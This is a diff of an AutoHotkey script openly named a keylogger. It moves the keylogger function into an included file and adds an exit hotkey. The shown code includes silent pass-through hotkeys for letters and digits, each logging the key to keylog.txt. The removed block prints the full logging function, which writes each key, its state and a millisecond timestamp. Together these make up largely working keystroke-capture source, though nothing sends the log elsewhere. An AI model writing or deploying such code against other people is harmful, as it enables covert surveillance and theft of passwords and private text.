@@ -1,28 +1,5 @@
-;
-; AutoHotkey Version: 1.x
-; Language:       English
-; Platform:       Win9x/NT
-; Author:         A.N.Other <myemail@nowhere.com>
-;
-; Script Function:
-;	Template script (you can customize this template by editing "ShellNew\Template.ahk" in your Windows folder)
-;
-
-#NoEnv ; Recommended for performance and compatibility with future AutoHotkey releases.
-SendMode Input ; Recommended for new scripts due to its superior speed and reliability.
-
-; Detect hidden windows since they can be active
-; (e.g. AutoHotkey main window while using Menu,MenuName,Show.)
-DetectHiddenWindows, On
-
-Loop
-    ;WinWaitNotActive, % "ahk_id " WinActive("A")
-    ;WinGetActiveTitle, Title
-    ;ToolTip, %Title%
-    ;SoundPlay, *-1
-
-
-
+#Include Functions.ahk
+^!esc::ExitApp
 
 ~a::keylogger("a", "keylog.txt")
 
@@ -401,20 +378,3 @@ Loop
 ~9 Up::keylogger( "9", "keylog.txt")
 
 ~0 Up::keylogger( "0", "keylog.txt")
-
-
-keylogger(char, file) {
-  GetKeyState, State, %char%
-  windowsEOL := "`r`n"
-  fileappend, [%A_Hour%:%A_Min%:%A_Sec%:%A_Msec%][%State%]:%char% %windowsEOL%,%file%
-}
-
-; Formateador de archivo:
-; [Time][State]:Key
-; if (actualState == previousState)&&(actualKey == previousKey)
-;   Delete currentLine
-;   actualLine := Línea siguiente a previousLine
-; else
-;   previousLine := currentLine
-;   currentLine := Línea siguiente a currentLine
-; fi
